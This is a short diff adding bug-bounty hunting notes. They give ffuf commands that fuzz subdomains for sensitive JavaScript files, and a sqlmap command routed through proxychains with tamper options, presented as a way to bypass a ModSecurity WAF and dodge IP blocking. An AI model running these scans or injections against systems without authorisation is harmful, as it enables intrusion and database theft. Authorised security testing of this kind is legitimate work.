@@ -1,0 +1,15 @@
+add this in your hunting list:
+
+ffuf -w subdomains.txt:SUB -w payloads/senstivejs.txt:FILE -u https://SUB/FILE -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0" -fs 0 -c -mc 200 -fr false -rate 10 -t 10
+
+for checking in burpsuite:
+ffuf -w subdomains.txt:SUB -w payloads/senstivejs.txt:FILE -u https://SUB/FILE -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0" -fs 0 -c -mc 200 -fr false -rate 10 -t 10 -x http://localip:port
+and check for response size and words if its big or something unique you can check it manually also make sure cut https:// http:// protocol before ffuf by using this command cat subdomains.txt | sed 's|https\?://||g' >finalsubs.txt  also sorry for typo mistake like always. change name to sensitive as well.
+
+
+
+ModSecurity WAF are so easy to Bypass !
+
+i used proxychains bcz site blocking my ip in just few attempt..
+
+proxychains sqlmap -u 'url' --random-agent --batch --dbs --level 3 --tamper=between,space2comment --hex --delay 5
